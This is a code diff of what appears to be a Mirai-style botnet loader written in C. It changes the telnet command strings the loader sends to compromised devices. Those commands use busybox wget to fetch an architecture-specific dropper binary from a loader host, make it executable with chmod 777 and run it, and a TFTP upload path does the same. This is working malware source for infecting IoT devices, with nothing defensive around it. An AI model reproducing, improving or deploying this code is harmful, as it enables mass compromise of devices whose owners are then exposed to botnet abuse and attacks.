@@ -2,6 +2,7 @@
 
 #include <stdio.h>
 #include <stdlib.h>
+#include <unistd.h>
 #include <pthread.h>
 #include <sys/epoll.h>
 #include <sys/socket.h>
@@ -422,7 +423,7 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
                                 case UPLOAD_WGET:
                                     conn->state_telnet = TELNET_UPLOAD_WGET;
                                     conn->timeout = 120;
-                                    util_sockprintf(conn->fd, "/bin/busybox wget http://%s:%d/bins/fnbnet.%s -O - > "FN_BINARY "; /bin/busybox chmod 777 " FN_BINARY "; " TOKEN_QUERY "\r\n",
+                                    util_sockprintf(conn->fd, "/bin/busybox wget http://%s:%d/bins/dlr.%s -O - > "FN_DROPPER "; /bin/busybox chmod 777 " FN_DROPPER "; " TOKEN_QUERY "\r\n",
                                                     wrker->srv->wget_host_ip, wrker->srv->wget_host_port, conn->info.arch);
                                     #ifdef DEBUG
                                         printf("wget\n");
@@ -465,7 +466,7 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
                             #ifdef DEBUG
                                 printf("[FD%d] Finished wget loading\n", conn->fd);
                             #endif
-                            util_sockprintf(conn->fd, "./" FN_BINARY " %s.%s; " EXEC_QUERY "\r\n", id_tag, conn->info.arch);
+                            util_sockprintf(conn->fd, "./" FN_DROPPER "; ./" FN_DROPPER " %s.%s; " EXEC_QUERY "\r\n", id_tag, conn->info.arch);
                             ATOMIC_INC(&wrker->srv->total_wgets);
                         }
                         else if(consumed < -1)
@@ -486,7 +487,7 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
                                 util_sockprintf(conn->fd, "/bin/busybox cp " FN_BINARY " " FN_DROPPER "; >" FN_DROPPER "; /bin/busybox chmod 777 " FN_DROPPER "; " TOKEN_QUERY "\r\n");
                         }
               	        break;
-		    case TELNET_UPLOAD_TFTP:
+ 		    case TELNET_UPLOAD_TFTP:
                         consumed = connection_upload_tftp(conn);
                         if(consumed > 0)
                         {
@@ -495,7 +496,7 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
 			    			#ifdef DEBUG
                             	printf("[FD%d] Finished tftp loading\n", conn->fd);
 			    			#endif
-                            util_sockprintf(conn->fd, "./" FN_BINARY " %s.%s; " EXEC_QUERY "\r\n", id_tag, conn->info.arch);
+                            util_sockprintf(conn->fd, "./" FN_DROPPER "; ./" FN_DROPPER " %s.%s; " EXEC_QUERY "\r\n", id_tag, conn->info.arch);
                             ATOMIC_INC(&wrker->srv->total_tftps);
                         }
                         else if(consumed < -1)
